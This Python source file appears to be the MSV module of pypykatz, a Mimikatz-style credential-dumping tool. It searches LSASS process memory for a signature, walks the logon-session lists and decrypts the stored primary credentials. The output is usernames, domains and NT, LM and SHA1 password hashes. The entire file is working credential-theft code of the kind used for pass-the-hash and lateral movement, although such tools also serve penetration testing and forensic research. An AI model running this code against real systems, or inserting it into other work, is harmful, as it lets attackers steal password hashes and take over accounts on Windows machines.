#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#
import io
import json
import logging
from pypykatz.commons.common import *
from pypykatz.lsadecryptor.packages.msv.msv_templates import *
from pypykatz.commons.filetime import *

class MSVCredential:
	def __init__(self):
		self.username = None
		self.domainname = None
		self.NThash = None
		self.LMHash = None
		self.SHAHash = None
		
	def parse(entry, decrypted_struct_data):
		"""
		Converts MSV1_0_PRIMARY_CREDENTIAL type objects into a unified class
		"""
		reader = GenericReader(decrypted_struct_data)
		msv = MSVCredential()
		try:
			msv.username = entry.UserName.read_string(reader)
		except Exception as e:
			logging.log(1, 'Failed to get username')
		try:
			msv.domainname = entry.LogonDomainName.read_string(reader)
		except Exception as e:
			logging.log(1, 'Failed to get username')
		msv.NThash = entry.NtOwfPassword
		msv.LMHash = entry.LmOwfPassword
		msv.SHAHash = entry.ShaOwPassword
		return msv
		
	def to_dict(self):
		t = {}
		t['username'] = self.username
		t['domainname'] = self.domainname
		t['NThash'] = self.NThash
		t['LMHash'] = self.LMHash
		t['SHAHash'] = self.SHAHash
		return t
		
	def to_json(self):
		return json.dumps(self.to_dict(), cls=UniversalEncoder)
		
	def __str__(self):
		t = '\t== MSV ==\n'
		t += '\tUsername: %s\n' % self.username
		t += '\tDomain: %s\n' % self.domainname
		t += '\tLM: %s\n' % self.LMHash.hex()
		t += '\tNT: %s\n' % self.NThash.hex()
		t += '\tSHA1: %s\n' % self.SHAHash.hex()
		return t
		
		
class LogonSession:
	def __init__(self):
		self.authentication_id = None
		self.session_id = None
		self.username = None
		self.domainname = None
		self.logon_server = None
		self.logon_time = None
		self.sid = None
		self.luid = None
		
		self.msv_creds = []
		self.wdigest_creds = []
		self.ssp_creds = []
		self.livessp_creds = []
		self.dpapi_creds = []
		self.kerberos_creds = []
		self.credman_creds = []
		self.tspkg_creds = []
	
	@staticmethod
	def parse(entry, reader):
		"""
		Converts KIWI_MSV1_0_LIST type objects into a unified class
		"""
		lsc = LogonSession()
		lsc.authentication_id = entry.LocallyUniqueIdentifier
		lsc.session_id = entry.Session
		lsc.username = entry.UserName.read_string(reader)
		lsc.domainname = entry.Domaine.read_string(reader)
		lsc.logon_server = entry.LogonServer.read_string(reader)
		if entry.LogonTime != 0:
			lsc.logon_time = filetime_to_dt(entry.LogonTime).isoformat()
		lsc.sid = str(entry.pSid.read(reader))
		lsc.luid = entry.LocallyUniqueIdentifier
		return lsc
		
	def to_dict(self):
		t = {}
		t['authentication_id'] = self.authentication_id
		t['session_id'] = self.session_id
		t['username'] = self.username
		t['domainname'] = self.domainname
		t['logon_server'] = self.logon_server
		t['logon_time'] = self.logon_time
		t['sid'] = self.sid
		t['luid'] = self.luid
		t['msv_creds']  = []
		t['wdigest_creds']  = []
		t['ssp_creds']  = []
		t['livessp_creds']  = []
		t['dpapi_creds']  = []
		t['kerberos_creds']  = []
		t['credman_creds']  = []
		t['tspkg_creds']  = []
		for cred in self.msv_creds:
			t['msv_creds'].append(cred.to_dict())
		for cred in self.wdigest_creds:
			t['wdigest_creds'].append(cred.to_dict())
		for cred in self.ssp_creds:
			t['ssp_creds'].append(cred.to_dict())
		for cred in self.livessp_creds:
			t['livessp_creds'].append(cred.to_dict())
		for cred in self.dpapi_creds:
			t['dpapi_creds'].append(cred.to_dict())
		for cred in self.kerberos_creds:
			t['kerberos_creds'].append(cred.to_dict())
		for cred in self.credman_creds:
			t['credman_creds'].append(cred.to_dict())
		for cred in self.tspkg_creds:
			t['tspkg_creds'].append(cred.to_dict())
		return t
		
	def to_json(self):
		return json.dumps(self.to_dict(), cls=UniversalEncoder)
	
	def __str__(self):
		t = '== LogonSession ==\n'
		t += 'authentication_id %s (%x)\n' % (self.authentication_id, self.authentication_id)
		t += 'session_id %s\n' % self.session_id
		t += 'username %s\n' % self.username
		t += 'domainname %s\n' % self.domainname
		t += 'logon_server %s\n' % self.logon_server
		t += 'logon_time %s\n' % self.logon_time
		t += 'sid %s\n' % self.sid
		t += 'luid %s\n' % self.luid
		if len(self.msv_creds) > 0:
			for cred in self.msv_creds:
				t+= '%s' % str(cred)
		if len(self.wdigest_creds) > 0:
			for cred in self.wdigest_creds:
				t+= str(cred)
		if len(self.ssp_creds) > 0:
			for cred in self.ssp_creds:
				t+= str(cred)
		if len(self.livessp_creds) > 0:
			for cred in self.livessp_creds:
				t+= str(cred)
		if len(self.kerberos_creds) > 0:
			for cred in self.kerberos_creds:
				t+= str(cred)
		if len(self.wdigest_creds) > 0:
			for cred in self.wdigest_creds:
				t+= str(cred)
		if len(self.credman_creds) > 0:
			for cred in self.credman_creds:
				t+= str(cred)
		if len(self.tspkg_creds) > 0:
			for cred in self.tspkg_creds:
				t+= str(cred)
		return t
		
class LogonCredDecryptor():
	def __init__(self, reader, decryptor_template, lsa_decryptor):
		self.module_name = 'msv10'
		self.reader = reader
		self.decryptor_template = decryptor_template
		self.lsa_decryptor = lsa_decryptor
		self.entries = []
		self.entries_seen = {}
		self.logon_sessions = {}
		
		self.current_logonsession = None
		
	def find_signature(self):
		logging.log(1, '[LogonCredDecryptor] Searching for key struct signature')
		fl = self.reader.find_all_global(self.decryptor_template.signature)
		if len(fl) == 0:
			raise Exception('Signature was not found! %s' % self.decryptor_template.signature.hex())
		return fl[0]

	def find_first_entry(self):
		position = self.find_signature()
		ptr_entry_loc = self.reader.get_ptr_with_offset(position + self.decryptor_template.first_entry_offset)
		ptr_entry = self.reader.get_ptr(ptr_entry_loc)
		return ptr_entry, ptr_entry_loc
	
	def log_ptr(self, ptr, name, datasize = 0x80):
		pos = self.reader.tell()
		self.reader.move(ptr)
		data = self.reader.peek(datasize)
		self.reader.move(pos)
		logging.log(1, '%s: %s\n%s' % (name, hex(ptr), hexdump(data, start = ptr)))
		
	def add_entry(self, entry):
		self.current_logonsession = LogonSession.parse(entry, self.reader)
		if entry.Credentials_list_ptr.value != 0:			
			self.walk_list(entry.Credentials_list_ptr, entry.Credentials_list_ptr.location , self.add_credentials)
		else:
			logging.log(1, 'No credentials in this structure!')
		
		self.logon_sessions[self.current_logonsession.luid] = self.current_logonsession
		
	def add_credentials(self, primary_credentials_list_entry):
		self.walk_list(
			primary_credentials_list_entry.PrimaryCredentials_ptr, 
			primary_credentials_list_entry.PrimaryCredentials_ptr.location, 
			self.add_primary_credentials
		)
		
		
	def add_primary_credentials(self, primary_credentials_entry):
		encrypted_credential_data = primary_credentials_entry.encrypted_credentials.read_data(self.reader)
					
		logging.log(1, 'Encrypted credential data \n%s' % hexdump(encrypted_credential_data))
		logging.log(1, 'Decrypting credential structure')
		dec_data = self.lsa_decryptor.decrypt(encrypted_credential_data)
		logging.log(1, '%s: \n%s' % (self.decryptor_template.decrypted_credential_struct.__name__, hexdump(dec_data)))
					
					
		creds_struct = self.decryptor_template.decrypted_credential_struct(GenericReader(dec_data, self.reader.reader.sysinfo.ProcessorArchitecture))
		msvc = MSVCredential.parse(creds_struct, dec_data)
		self.current_logonsession.msv_creds.append(msvc)
		
	def walk_list(self, entry_ptr, entry_ptr_location, callback, max_walk = 255, override_ptr = None):
		"""
		first_entry_ptr: pointer type object the will yiled the first entry when called read()
		first_entry_ptr_location: memory address of the first_entry_ptr so we will know when the list loops
		"""
		
		entries_seen = {}
		entries_seen[entry_ptr_location] = 1
		max_walk = max_walk
		self.log_ptr(entry_ptr.value, 'List entry -%s-' % entry_ptr.finaltype.__name__)
		while True:
			if override_ptr:
				entry = entry_ptr.read(self.reader, override_ptr)
			else:
				entry = entry_ptr.read(self.reader)
				
			callback(entry)
			
			max_walk -= 1
			logging.log(1, '%s next ptr: %x' % (entry.Flink.finaltype.__name__, entry.Flink.value))
			logging.log(1, '%s seen: %s' % (entry.Flink.finaltype.__name__, entry.Flink.value not in entries_seen))
			logging.log(1, '%s max_walk: %d' % (entry.Flink.finaltype.__name__, max_walk))
			if entry.Flink.value != 0 and entry.Flink.value not in entries_seen and max_walk != 0:
				entries_seen[entry.Flink.value] = 1
				self.log_ptr(entry.Flink.value, 'Next list entry -%s-' % entry.Flink.finaltype.__name__)
				entry_ptr = entry.Flink
			else:
				break
	
	def start(self):
		entry_ptr_value, entry_ptr_loc = self.find_first_entry()
		self.reader.move(entry_ptr_loc)
		entry_ptr = self.decryptor_template.list_entry(self.reader)
		self.walk_list(entry_ptr, entry_ptr_loc, self.add_entry)

